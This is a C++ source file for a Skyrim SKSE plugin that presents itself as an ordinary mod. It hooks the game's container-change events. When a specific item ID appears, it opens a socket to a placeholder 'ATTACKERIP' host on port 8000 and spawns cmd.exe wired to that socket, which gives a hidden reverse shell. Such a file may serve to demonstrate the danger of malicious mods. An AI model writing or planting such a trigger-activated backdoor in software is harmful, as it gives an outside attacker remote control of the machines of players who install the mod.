#include "logger.h" 
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "ATTACKERIP";
char port[6] = "8000";

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

struct OurEventSink : public RE::BSTEventSink<RE::TESContainerChangedEvent> {
    
    RE::BSEventNotifyControl ProcessEvent(const RE::TESContainerChangedEvent* event,
                                          RE::BSTEventSource<RE::TESContainerChangedEvent>*) {

        auto baseID = event->baseObj;
        //auto baseID = event->uniqueID;

        if (baseID == 320742) {
            logger::info("RELEASE THE BEACON! ID: {}", baseID);

            //WSAStartup(MAKEWORD(2, 2), &wsaData);
            Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

            struct hostent* host;
            host = gethostbyname(ip_addr);
            strcpy_s(ip_addr, inet_ntoa(*((struct in_addr*)host->h_addr)));

            hax.sin_family = AF_INET;
            hax.sin_port = htons(atoi(port));
            hax.sin_addr.s_addr = inet_addr(ip_addr);

            WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

            memset(&ini_processo, 0, sizeof(ini_processo));
            ini_processo.cb = sizeof(ini_processo);
            ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

            TCHAR cmd[255] = TEXT("cmd.exe");

            CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

        }
        return RE::BSEventNotifyControl::kContinue;
    }

};

SKSEPluginLoad(const SKSE::LoadInterface *skse) {
    SKSE::Init(skse);
    SetupLog();
    
    // ScriptSource
    auto* eventSink = new OurEventSink();
    auto* eventSourceHolder = RE::ScriptEventSourceHolder::GetSingleton();
    eventSourceHolder->AddEventSink<RE::TESContainerChangedEvent>(eventSink);
    return true;
}
